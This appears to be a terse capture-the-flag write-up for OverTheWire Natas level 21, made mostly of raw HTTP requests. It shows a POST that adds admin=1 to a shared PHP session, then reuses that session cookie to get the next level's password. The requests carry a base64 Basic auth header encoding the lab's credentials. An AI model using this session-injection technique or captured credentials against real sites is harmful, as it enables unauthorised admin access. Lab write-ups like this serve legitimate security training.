GET /index.php HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Cookie: PHPSESSID=kgg8s9ep66jeihlc55u5dugtid
Upgrade-Insecure-Requests: 1

# Level 21 -> Level 22

```
POST /index.php HTTP/1.1
Host: natas21-experimenter.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: http://natas21-experimenter.natas.labs.overthewire.org
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Referer: http://natas21-experimenter.natas.labs.overthewire.org/index.php
Cookie: PHPSESSID=kgg8s9ep66jeihlc55u5dugtid
Upgrade-Insecure-Requests: 1

align=center&fontsize=100%25&bgcolor=yellow&admin=1&submit=Update
```

set admin=1, copy the PHPSESSID from experimental site  
now use that PHPSESSID to get password from original site  
GET /index.php HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Cookie: PHPSESSID=kgg8s9ep66jeihlc55u5dugtid
Upgrade-Insecure-Requests: 1


```
GET /index.php HTTP/1.1
Host: natas21.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic bmF0YXMyMTpCUGh2NjNjS0UxbGtRbDA0Y0U1Q3VGVHpYZTE1TmZpSA==
Connection: keep-alive
Cookie: PHPSESSID=kgg8s9ep66jeihlc55u5dugtid
Upgrade-Insecure-Requests: 1
```

